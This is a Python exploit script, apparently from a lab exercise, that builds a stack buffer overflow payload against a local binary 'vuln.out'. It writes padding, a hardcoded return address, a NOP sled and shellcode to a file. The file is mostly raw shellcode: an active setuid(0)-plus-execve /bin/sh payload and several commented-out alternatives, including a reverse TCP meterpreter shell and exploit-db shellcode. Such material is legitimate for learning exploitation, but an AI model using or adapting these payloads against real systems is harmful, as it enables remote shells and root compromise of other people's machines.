#!/usr/bin/python3

import subprocess as sp
import sys

# Send specific exploit string to get the shell on the vulnerable server
# \x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x49\x11\x40\x00\x00\x00\x00\x00\x90\x90\x90\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x35\x4d\x2a\xd9\xd6\xc5\xb3\x3e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x7d\xf5\x05\xbb\xbf\xab\x9c\x4d\x5d\x4d\xb3\x89\x82\x9a\xe1\x58\x5d\x60\x49\x8d\x88\x97\x5b\x36\x35\x4d\x2a\xf6\xb4\xac\xdd\x11\x46\x25\x2a\x8f\x81\x91\xed\x54\x0e\x15\x25\xdc\xd6\xc5\xb3\x3e


# get our shellcode
def get_shellcode():
    ''' buf =  b"" #/bin/sh
    buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
    buf += b"\xef\xff\xff\xff\x48\xbb\x35\x4d\x2a\xd9\xd6\xc5\xb3"
    buf += b"\x3e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += b"\x7d\xf5\x05\xbb\xbf\xab\x9c\x4d\x5d\x4d\xb3\x89\x82"
    buf += b"\x9a\xe1\x58\x5d\x60\x49\x8d\x88\x97\x5b\x36\x35\x4d"
    buf += b"\x2a\xf6\xb4\xac\xdd\x11\x46\x25\x2a\x8f\x81\x91\xed"
    buf += b"\x54\x0e\x15\x25\xdc\xd6\xc5\xb3\x3e"
    '''
    
    # uname
    ''' 
    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05"
    buf += b"\xef\xff\xff\xff\x48\xbb\x7c\xc3\x36\xca\xb4\x4f\x73"
    buf += b"\xf9\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += b"\x34\x7b\x19\xa8\xdd\x21\x5c\x8a\x14\xc3\xaf\x9a\xe0"
    buf += b"\x10\x21\x9f\x14\xee\x55\x9e\xea\x1d\x9b\xf6\x7c\xc3"
    buf += b"\x36\xe5\xc1\x3c\x01\xd6\x1e\xaa\x58\xe5\xc1\x21\x12"
    buf += b"\x94\x19\xc3\x60\x9d\xe0\x11\x19\xc2\x24\xcc\x33\xca"
    buf += b"\xb4\x4f\x73\xf9"
    '''

    ''' nothing
    buf =  b"" 
    buf += b"\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05"
    buf += b"\xef\xff\xff\xff\x48\xbb\x89\x60\xff\x4b\x24\x04\x33"
    buf += b"\xcd\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += b"\xc1\xd8\xd0\x29\x4d\x6a\x1c\xbe\xe1\x60\x66\x1b\x70"
    buf += b"\x5b\x61\x93\xe3\x5b\xa7\x44\x21\x04\x33\xcd"
    '''
    # reverse tcp meterpreter shell
    '''
    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d\x05"
    buf += b"\xef\xff\xff\xff\x48\xbb\xb3\x81\xa7\x46\x32\xc9\x14"
    buf += b"\x08\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += b"\xfb\xb0\x58\x2c\x3b\x91\x8d\xbe\xa3\xc9\x2e\x90\x7f"
    buf += b"\xf8\xdd\x62\x91\xc0\xfd\xf4\x35\xc6\x11\x40\x36\x41"
    buf += b"\xdf\x17\x58\xc3\x55\x51\xe3\xeb\x8e\x1e\xab\xa3\x16"
    buf += b"\x57\xd9\x80\xf9\x49\x37\x81\x91\xc8\xcb\xba\xef\xd1"
    buf += b"\x7a\x70\x16\x08\xa2\xdd\x67\xee\xc1\x68\x45\x40\x3a"
    buf += b"\x67\xcd\x56\x68\xa3\x3e\x50\xbc\x84\xfe\x0e\xb7\x09"
    buf += b"\x6d\x2d\xfa\x7e\x6e\x32\x2a\x9e\x7e\x2b\xeb\xeb\xa7"
    buf += b"\x2c\x37\x81\x9d\xef\xfb\xb0\x51\x49\x37\x90\x4d\x57"
    buf += b"\xfb\x04\x67\x3f\xf5\xa3\x28\x50\xd9\x80\xf8\x49\x37"
    buf += b"\x97\x7e\x76\xe9\x8e\xa2\x0e\xb7\x09\x6c\xe5\x4c\x67"
    buf += b"\xa7\x46\x32\xc9\x14\x08"
    '''

    # shellcode from exploit-db id# 46907
   #  buf = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    
    # shellcoee #2 from email
    # buf = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
    
    # msfvenom /usr/bin/whoami
    ''' 
    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05"
    buf += b"\xef\xff\xff\xff\x48\xbb\x94\x83\x58\xa7\x79\x4d\x3e"
    buf += b"\xfb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += b"\xdc\x3b\x77\xc5\x10\x23\x11\x88\xfc\x83\xc1\xf7\x2d"
    buf += b"\x12\x6c\x9d\xfc\xae\x3b\xf3\x27\x1f\xd6\xeb\x94\x83"
    buf += b"\x58\x88\x0c\x3e\x4c\xd4\xf6\xea\x36\x88\x0e\x25\x51"
    buf += b"\x9a\xf9\xea\x58\xf1\x2e\x19\x60\x91\xaf\xdb\x57\xa2"
    buf += b"\x79\x4d\x3e\xfb"
    '''

    # random guy on stack overflow shellcode
    # buf = b"\xeb\x18\x5f\x31\xc0\x88\x47\x07\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05\x30\xc0\x88\x07\xb0\x3c\x0f\x05\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\xd0\xd8\xff\xff\xff\x7f"

    # setuid(0) + execve(/bin/bash)
    buf = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"


    return buf


def main():
    # number of garbage characters to send
    length = int(sys.argv[1])
    
    # what will go where the ret address is!
    # this should be the location of a jmp that will jmp us to our shellcode
    # 0x401139
    eip = b"\x49\x11\x40\x00\x00\x00\x00\x00"

    # buf is the shellcode that is defined above
    payload = get_shellcode()
    
    garbage = b"\x41"*length
    nop_sled = b"\x90"*50
    exploit_str = garbage + eip + nop_sled + payload

    # print("Exploit String: " + exploit_str)
    with open("exploit_payload.bin", "wb") as f:
        f.write(exploit_str)
    
    # does not work
    # sp.call("{cat exploit_payload.bin; cat - ; } | ./vuln.out", shell=True)



if __name__ == "__main__":
    main()
